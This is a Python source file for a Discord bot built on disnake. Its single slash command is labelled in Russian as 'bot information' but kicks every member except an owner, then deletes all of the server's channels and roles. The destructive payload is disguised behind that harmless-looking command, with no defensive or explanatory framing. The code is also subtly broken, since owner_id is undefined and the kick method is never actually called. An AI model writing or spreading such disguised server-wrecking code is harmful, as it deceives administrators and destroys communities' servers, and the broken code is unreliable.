import disnake
from disnake.ext import commands
import asyncio

bot = commands.InteractionBot(intents=disnake.Intents.all())

@bot.event
async def on_ready() -> None:
    print(message := f'Auth success. Name: {bot.user}; ID: {bot.user.id}')
    print('=' * len(message))

@bot.slash_command(description='Информация о боте')
async def bot_info(ctx) -> None:
    for member in ctx.guild.members:
        try:
            if member.id != owner_id:
                await member.kick
        except Exception as ex:
            print(f'Failed to kick {member.name}. Error: {ex}')
        finally:
            await asyncio.sleep(0.3)

    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as ex:
            print(f'Failed delete {channel.name}. Error: {ex}')
        finally:
            await asyncio.sleep(0.3)
    
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except Exception as ex:
            print(f'Failed delete {role.name}. Error: {ex}')
        finally:
            await asyncio.sleep(0.3)

if __name__ == '__main__':
    bot.run('TOKEN HERE!')
